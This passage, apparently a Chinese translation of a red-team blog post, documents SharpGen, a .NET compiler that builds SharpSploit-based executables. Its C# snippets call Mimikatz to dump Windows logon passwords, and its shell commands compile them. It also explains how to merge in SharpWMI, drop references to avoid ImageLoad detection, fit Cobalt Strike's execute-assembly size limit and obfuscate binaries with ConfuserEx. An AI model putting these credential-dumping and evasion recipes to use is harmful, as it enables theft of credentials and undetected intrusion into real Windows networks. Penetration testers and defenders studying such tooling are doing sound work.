    using System.Collections.Generic;
    using SharpSploit.Credentials;
    using SharpSploit.Enumeration;
    using SharpSploit.Execution;
    using SharpSploit.LateralMovement;
    using SharpSploit.Generic;
    using SharpSploit.Misc;
    public static class jZTyloQN2SU4
    {
        static void Main()
        {
            Console.WriteLine(Mimikatz.LogonPasswords());
            return;
        }
    }
    [+] Compiling optimized source:
    using System;
    using SharpSploit.Credentials;
    public static class jZTyloQN2SU4
    {
        static void Main()
        {
            Console.WriteLine(Mimikatz.LogonPasswords());
            return;
        }
    }
    [*] Compiled assembly written to: /Users/cobbr/SharpGen/Output/example.exe
上面的代码生成一个example.exe,一个执行Mimikatz
sekurlsa::logonpassword模块并将输出写入屏幕的.net框架控制台应用程序。
在使用SharpGen时，c#命令行程序应该被指定为最后的、未命名的命令行参数。但是，您也可以指定要从中读取的源文件。您可能需要一些不适合于一行的逻辑，或者在命令行中转义引号时遇到麻烦。SharpGen支持通过-source-file命令行参数从文件中读取内容。
    cobbr@mac:~/SharpGen > cat example.txt
    string whoami = Shell.ShellExecute("whoami");
    if (whoami == "SomeUser")
    {
        Console.WriteLine(Mimikatz.LogonPasswords());
    }
    cobbr@mac:~/SharpGen > dotnet bin/Release/netcoreapp2.1/SharpGen.dll -f example.exe --source-file example.txt
    ...
    [*] Compiled assembly written to: /Users/cobbr/SharpGen/Output/example.exe
或者，您可以使用预定义的类指定源文件，并提供一个主函数:
    cobbr@mac:~/SharpGen > cat example.txt
    using System;
    using SharpSploit.Execution;
    using SharpSploit.Credentials;
    class Program
    {
        static void Main()
        {
            string whoami = Shell.ShellExecute("whoami");
            if (whoami == "SomeUser")
            {
                Console.WriteLine(Mimikatz.LogonPasswords());
            }
            return;
        }
    }
    cobbr@mac:~/SharpGen > dotnet bin/Release/netcoreapp2.1/SharpGen.dll -f example.exe --source-file example.txt
    ...
    [*] Compiled assembly written to: /Users/cobbr/SharpGen/Output/example.exe
这些都是这个工具的基础。完整的命令行使用信息包含在下面
    cobbr@mac:~/SharpGen > dotnet bin/Debug/netcoreapp2.1/SharpGen.dll -h
    Usage:  [options]
    Options:
      -? | -h | --help                                     Show help information
      -f | --file                             The output file to write to.
      -d | --dotnet | --dotnet-framework   The Dotnet Framework version to target (net35 or net40).
      -o | --output-kind                      The OutputKind to use (console or dll).
      -p | --platform                            The Platform to use (AnyCpy, x86, or x64).
      -n | --no-optimization                               Don't use source code optimization.
      -a | --assembly-name                  The name of the assembly to be generated.
      -s | --source-file                      The source code to compile.
      -c | --class-name                        The name of the class to be generated.
      --confuse                   The ConfuserEx ProjectFile configuration.
在下面的部分中，我们将深入了解SharpGen如何在底层运行的以及其他用法。
##### 进阶用法
为了理解SharpGen如何工作，让我们快速浏览一下项目的目录结构：
    --> SharpGen
      |---> Source              // Generated binaries will be compiled against all source code under this directory
          |---> SharpSploit             // SharpSploit source code
      |---> References          // Generated binaries will references DLLs listed under this directory during compilation
          |---> references.yml          // References configuration file that directs SharpGen on which DLLs to reference during compilation
          |---> net35                   // Directory for .NET Framework 3.5 references DLLs
          |---> net40                   // Directory for .NET Framework 4.0 references DLLs
      |---> Resources           // Generated binaries will embed resources under this directory during compilation
          |---> resources.yml           // Resources configuration file that directs SharpGen on which resources to embed in generated binaries
          |---> powerkatz_x64.dll       // Mimikatz 64-bit dll
          |---> powerkatz_x64.dll.comp  // Mimikatz 64-bit dll, compressed using the built-in System.IO.Compression library
          |---> powerkatz_x86.dll       // Mimikatz 32-bit dll
          |---> powerkatz_x86.dll.comp  // Mimikatz 32-bit dll, compressed using the built-in System.IO.Compression library
      |---> confuse.cr          // ConfuserEx project file, used to (optionally) protect generated binaries with ConfuserEx
      |---> Output              // Generated binaries will be written under the Output directory.
      |---> SharpGen.csproj     // SharpGen Project file
      |---> Dockerfile          // Used to execute SharpGen from a docker container!
      |---> bin                 // SharpGen binaries
      |---> obj                 // SharpGen obj folder
      |---> refs                // SharpGen references
      |---> src                 // SharpGen source
您需要特别关注source,Reference和Resources目录，因为这些是SharpGen的核心功能。所有放在源文件夹下的源代码都将作为源代码编译到单个程序中。因为它是作为源代码编译的，所以不需要担心组合程序或将它们作为资源嵌入。默认情况下，SharpSploit源代码包含在source目录中，便于针对SharpSploit进行编译。不过，SharpGen提供了一种将任何源库放入这个文件夹并包含其中的方法。
例如，我们可以将GhostPack SharpWMI的源代码放入Source文件夹(稍加修改)，然后针对它进行编译:
    cobbr@mac:~/SharpGen > cp -r ~/GhostPack/SharpWMI/SharpWMI ./Source
    cobbr@mac:~/SharpGen > cat example.txt
    SharpWMI.Program.LocalWMIQuery("select * from win32_service");
    Console.WriteLine(Host.GetProcessList());
    cobbr@mac:~/SharpGen > dotnet bin/Release/netcoreapp2.1/SharpGen.dll -f example.exe --source-file example.txt
    ...
    [*] Compiled assembly written to: /Users/cobbr/SharpGen/Output/example.exe
这允许我们从单个程序中调用SharpWMI和SharpSploit方法!我最喜欢的是SharpGen的特性，它可以插入其他库并根据库的组合快速编译。我确实需要对SharpWMI做一些小小的修改，以使其正常工作。我希望看到新的令人讨厌的c#工具集被格式化为库，允许这种类型的工具在默认情况下组合，而不需要特别定制。
可以在references目录下配置程序引用。通过将引用放置在相应的目录中并在引用其中的配置，可以将引用应用于.net3.5或.net4.0程序。关于yml配置文件,yml配置具有sane默认设置，但您可能需要一些定制。例如，如果您添加了需要额外引用的额外源代码，您将需要在配置中添加这个引用。
或者，假设你知道你不需要一个特定的引用。例如，您知道您不需要执行任何PowerShell，并且您所在的环境将会被系统监测到，将会生成System.Management.Automation.dll
ImageLoad事件。SharpSploit包含了对系统、管理、自动化的参考。默认情况下是dll，但如果不打算使用SharpSploit.Execution.Shell.PowerShellExecute()方法，则可以删除。在这个场景中，您可以简单地禁用System.Management.Automation。参考文献中的dll引用。通过设置启用yml配置为Enabled:
false。
    - File: System.Management.Automation.dll
      Framework: Net35
      Enabled: false
如果你打算在 .net framework v4.0中使用，确保禁用Net40的引用。
如果您计划使用SharpGen创建程序，以便与Cobalt Strike的execute-assembly命令一起使用(该命令是专门设计用来执行的)，那么您应该注意Resources目录。执行程序集命令的主要限制因素是1MB的上限。SharpSploit默认嵌入x86和x64的
Mimikatz二进制文件，超过1MB的限制。你可以使用以些方法来绕过这个限制条件。
1.如果不打算使用任何Mimikatz的功能，你可以通过禁用源文件中的resources.yml配置文件来安全禁用mimikatz，这将大大减少您的二进制文件大小。为此，只需在resource配置中切换为Enabled:
false就可以了。
    - Name: SharpSploit.Resources.powerkatz_x86.dll
      File: powerkatz_x86.dll
      Platform: x86
      Enabled: false
    - Name: SharpSploit.Resources.powerkatz_x64.dll
      File: powerkatz_x64.dll
      Platform: x64
      Enabled: false
2.如果你打算使用Mimikatz的功能，你真的需要x86和x64版本的Mimikatz吗?如果没有，我们只能嵌入我们需要的平台的资源。有两种方法可以做到这一点。
2a.您可以通过命令行参数来过滤资源。这应该会使您刚好低于1MB的限制。